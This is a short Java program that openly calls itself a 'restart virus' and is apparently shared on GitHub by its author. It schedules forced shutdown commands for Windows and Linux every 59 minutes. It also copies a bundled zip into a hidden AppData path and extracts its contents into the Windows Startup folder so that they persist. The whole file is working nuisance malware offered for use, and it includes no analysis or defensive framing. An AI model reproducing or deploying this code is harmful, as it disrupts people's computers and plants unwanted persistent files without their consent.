package in.momin5.restartvirus;


import net.lingala.zip4j.ZipFile;
import org.apache.commons.io.IOUtils;


import java.io.*;
import java.util.Timer;
import java.util.TimerTask;

/*
written by Momin5 :sunglasses:
https://github.com/MOMIN5
im also using a zip library called zip4j cause i couldnt figure out how to make files extract to paths using just java
 */
public class Main {

    public static void main(String[] args) throws Exception {
        timer();
        extract();
        System.out.println("Should shutdown computer in 1 hour, https://github.com/MOMIN5/restart-virus-java ");
    }
    public static void timer() {
        Timer timer = new Timer();

        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try{
                    Runtime.getRuntime().exec("shutdown.exe -s -t 0"); //executes if windows
                    Runtime.getRuntime().exec("shutdown -h now"); // executes if linux
                }
                catch (IOException a){ // since it throws exceptions catch it
                    System.out.println(a);
                }
            }
        }, 59*60*1000, 59*60*1000 ); // timer executes after 59 minutes
    }

    public static void extract() throws IOException{

        InputStream is = Main.class.getClassLoader().getResourceAsStream("this.zip");
        File file = new File(System.getProperty("user.home")+ "\\AppData\\Roaming\\Microsoft\\Main");
        try(OutputStream outputStream = new FileOutputStream(file)){
            IOUtils.copy(is, outputStream);
        }catch (FileNotFoundException w){
        }catch (IOException s){
        }

        String infectPathWindows = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

        ZipFile z1 = new ZipFile(file);
        z1.extractAll(infectPathWindows);

    }
}


